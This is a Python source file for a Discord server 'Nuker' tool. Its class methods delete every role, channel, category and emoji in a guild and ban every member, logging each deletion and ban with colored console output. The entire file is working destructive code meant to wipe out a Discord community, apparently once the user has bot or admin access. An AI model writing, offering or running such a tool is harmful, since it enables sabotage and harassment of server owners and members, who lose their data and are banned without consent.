import discord
from colorama import Fore, init, Style



def print_add(message):
    print(f'{Fore.GREEN}[+]{Style.RESET_ALL} {message}')

def print_delete(message):
    print(f'{Fore.RED}[-]{Style.RESET_ALL} {message}')

def print_warning(message):
    print(f'{Fore.RED}[WARNING]{Style.RESET_ALL} {message}')


def print_error(message):
    print(f'{Fore.RED}[ERROR]{Style.RESET_ALL} {message}')


class Nuker:
    @staticmethod
    async def roles_delete(guild_to: discord.Guild):
            try:
                for role in guild_to.roles:
                    await role.delete()
                    print_delete(f"Deleted Role: {role.name}")
            except discord.Forbidden:
                    print_error(f"Error While Deleting Role: {role.name}")
            except discord.HTTPException:
                    print_error(f"Unable to Delete Role: {role.name}")

    @staticmethod
    async def channels_delete(guild_to: discord.Guild):
        for channel in guild_to.channels:
            try:
                await channel.delete()
                print_delete(f"Deleted Channel: {channel.name}")
            except discord.Forbidden:
                print_error(f"Error While Deleting Channel: {channel.name}")
            except discord.HTTPException:
                print_error(f"Unable To Delete Channel: {channel.name}")

    @staticmethod
    async def categories_delete(guild_to: discord.Guild):
        for category in guild_to.categories:
            try:
                await category.delete()
                print_delete(f"Deleted Category: {category.name}")
            except discord.Forbidden:
                print_error(f"Error While Deleting Category: {category.name}")
            except discord.HTTPException:
                print_error(f"Unable To Delete Category: {category.name}")

    @staticmethod
    async def ban_all(guild_to: discord.Guild):
        for member in guild_to.members:
            try:
                await member.ban()
                print_delete(f"Banned Member: {member.name}#{member.discriminator}")
            except discord.Forbidden:
                print_error(f"Error While Banning Member: {member.name}#{member.discriminator} (forbidden)")
            except discord.HTTPException:
                print_error(f"Unable To Ban Member: {member.name}#{member.discriminator} (rlimit)")


    @staticmethod
    async def emojis_delete(guild_to: discord.Guild):
        for emoji in guild_to.emojis:
            try:
                await emoji.delete()
                print_delete(f"Deleted Emoji: {emoji.name}")
            except discord.Forbidden:
                print_error(f"Error While Deleting Emoji{emoji.name}")
            except discord.HTTPException:
                print_error(f"Error While Deleting Emoji {emoji.name}")